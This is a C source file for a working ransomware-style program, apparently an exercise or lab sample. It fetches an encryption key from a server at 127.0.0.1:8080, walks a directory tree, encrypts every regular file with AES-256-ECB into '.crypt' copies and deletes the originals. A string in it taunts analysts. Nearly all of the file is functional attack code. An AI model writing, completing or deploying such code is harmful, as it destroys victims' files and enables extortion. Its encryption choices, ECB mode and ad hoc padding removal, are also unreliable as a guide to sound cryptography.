#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <dirent.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <client.h>
#include <client_ssl.h>
#define MAX_PATH_SIZE 4096
#define BUFFER_SIZE 2048
#define ip "127.0.0.1"
#define port 8080
volatile unsigned char lol[] = "STOP with your dirty trix is a aes ecb you should see network capture";

EVP_CIPHER_CTX *ctx;

int encrypt_buff(unsigned char *plaintext, int plaintext_len, unsigned char *ciphertext, unsigned char *key, unsigned char *iv){
    //on fait bloc par buff par buff
    int len;
    int ciphertext_len;

    if(!(ctx = EVP_CIPHER_CTX_new()))
        exit(1);

    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_ecb(), NULL, key, iv))
    exit(1);

    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        exit(1);
    ciphertext_len = len;

    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext+len, &len))
        exit(1);
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}

void encrypt_file(const char *file_path, unsigned char *key){
  printf("encrypt this file : %s\n", file_path);
  FILE *file = fopen(file_path, "r");
  if(file==NULL){
    perror("");
    return ;
  }
  unsigned char buff[BUFFER_SIZE];
  // un bloc de padding
  unsigned char ciphertext[BUFFER_SIZE+16];
  int size;
  int encrypted_size;

  //create a new file
  char *new_name = malloc(sizeof(char)*strlen(file_path) + 8);
  if(new_name==NULL){
    puts("Allocation FAILURE");
    exit(EXIT_FAILURE);
  }
  memset(new_name, 0, sizeof(char)*strlen(file_path) + 8);
  snprintf(new_name, sizeof(char)*strlen(file_path) + 8, "%s.crypt", file_path);
  FILE *new_file = fopen(new_name, "w");
  if(new_file==NULL){
    perror("");
    //free memories
    goto CLEANUP;
  }
  do {
    //read and encrypt buffer
    size=fread(buff, 1, BUFFER_SIZE, file);
    encrypted_size=encrypt_buff(buff, size, ciphertext, (unsigned char *)key,NULL);
    if(encrypted_size==BUFFER_SIZE+16){
      //on retire le bloc de padding vue
      //qu'il y a encore des info dans le fichier
      encrypted_size = BUFFER_SIZE;
    }
    fwrite(ciphertext, 1, encrypted_size, new_file);
  } while(size==BUFFER_SIZE);
  //!!! warning if you uncomment remove you will remove plaintext file be carefull
  ////////////////////
  remove(file_path);//
  ////////////////////
  fclose(new_file);
  CLEANUP:
  //free memories
  fclose(file);
  free(new_name);
  }

void walk_like_cowboy(const char *file_name, unsigned char *key){
  DIR *dir = opendir(file_name);
  struct dirent *fichierLu = NULL;
  if (dir==NULL) {
    perror("");
    exit(1);
  }
  fichierLu = readdir(dir);
  while (fichierLu!=NULL) {
    // on exclue les deux fichier . et .. qui sont spécial
    if (strcmp(fichierLu->d_name, ".")!=0 && strcmp(fichierLu->d_name, "..")!=0) {
        char path[MAX_PATH_SIZE];
        snprintf(path, sizeof(path), "%s/%s",file_name, fichierLu->d_name);
        if (strlen(path) == MAX_PATH_SIZE) {
          puts("PATH trop grande");
          exit(1);
        }
        if (fichierLu->d_type == DT_DIR) { // if is directory
          walk_like_cowboy((const char*)path, key);
        } else if(fichierLu->d_type == DT_REG){ // if is a file
          encrypt_file((const char*)path, key);
        }

    }
    fichierLu = readdir(dir);
  }
  // on sort proprement
  closedir(dir);
}

void encrypt_dir(int size,const char **lst_dir, unsigned char *key) {
  for (size_t i = 0; i < size; i++) {
    walk_like_cowboy(lst_dir[i], key);
  }
}

int main(int argc, const char *argv[]) {
  if (argc<2) {
    printf("Usage: %s dir_name\n", argv[0]);
    exit(1);
  }
  unsigned char *key = get_key(ip, port);
  char const *test[] = {argv[1]};
  encrypt_dir(1, (const char **)test, key);
  return 0;
}
